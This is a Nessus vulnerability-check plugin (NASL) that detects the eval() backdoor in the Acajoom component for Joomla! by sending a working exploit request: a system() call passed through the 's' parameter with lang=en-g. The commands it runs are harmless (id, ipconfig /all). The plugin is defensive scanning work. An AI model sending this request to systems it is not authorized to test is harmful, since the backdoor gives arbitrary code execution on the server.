#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(39482);
  script_version("$Revision: 1.15 $");
  script_cvs_date("$Date: 2017/05/19 13:58:06 $");

  script_bugtraq_id(35459);
  script_osvdb_id(55733);

  script_name(english:"Acajoom Component for Joomla! <= 3.2.6 Backdoor Detection");
  script_summary(english:"Attempts to execute a command.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
backdoor allowing the execution of arbitrary code.");
  script_set_attribute(attribute:"description", value:
"Acajoom, a third-party component for Joomla! for managing mailing
lists, newsletters, auto-responders, and other communications, is
running on the remote host. This version of Acajoom is equal or prior
to 3.2.6. It is, therefore, affected by a backdoor in the
self.acajoom.php script. An unauthenticated, remote attacker can
exploit this backdoor by setting the 'lang' parameter to 'en-g' and
calling the script to pass arbitrary input via the 's' parameter to
an eval() call, thereby resulting in the execution of arbitrary PHP
code, subject to the privileges of the web server user ID.

Note that there is reportedly also another backdoor involving the
GetBots() function in the install.acajoom.php script, which emails
information to an address in the Russian Federation when the component
is installed. However, Nessus has not checked for this.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2009/Jun/209");
  # https://web.archive.org/web/20090708091740/http://www.ijoobi.com/blog/latest/acajoom-free-version-3.2.7-available.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?87a9de8b");
  script_set_attribute(attribute:"solution", value:
"Verify if the remote host has been compromised and reinstall the
system if necessary. Upgrade to Acajoom version 3.2.7 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/06/22");
  script_set_attribute(attribute:"patch_publication_date", value:"2009/07/08");
  script_set_attribute(attribute:"plugin_publication_date", value:"2009/06/23");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2017 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Joomla!", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");

app = "Joomla!";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url =  build_url(port:port, qs:dir);

# Verify component is installed
plugin = "Acajoom";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  regexes = make_list();
  regexes[0] = make_list('table.acajoomcss');
  checks["/components/com_acajoom/css/acajoom.css"]=regexes;

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );

}
if (!installed) audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " component");

os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = "ipconfig /all";
  else cmd = "id";
  cmds = make_list(cmd);
}
else cmds = make_list("id", "ipconfig /all");
cmd_pats = make_array();
cmd_pats["id"] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig /all'] = 'Windows IP Configuration|Subnet Mask|IP(v(4|6)?)? Address';

# Try to exploit the issue to run a command.
foreach cmd (cmds)
{
  exploit = "system('" +cmd+ "');";
  url = "/components/com_acajoom/self.acajoom.php?s=" +urlencode(str:exploit)+ "&lang=en-g";

  res = http_send_recv3(
    port   : port,
    method : "GET",
    item   : dir + url,
    exit_on_fail : TRUE
  );

  # There's a problem if we see the expected command output.
  if (egrep(pattern:cmd_pats[cmd], string:res[2]))
  {
    security_report_v4(
      port        : port,
      severity    : SECURITY_HOLE,
      cmd         : cmd,
      request     : make_list(install_url + url),
      output      : chomp(res[2])
    );
    exit(0);
  }
}
audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " component");
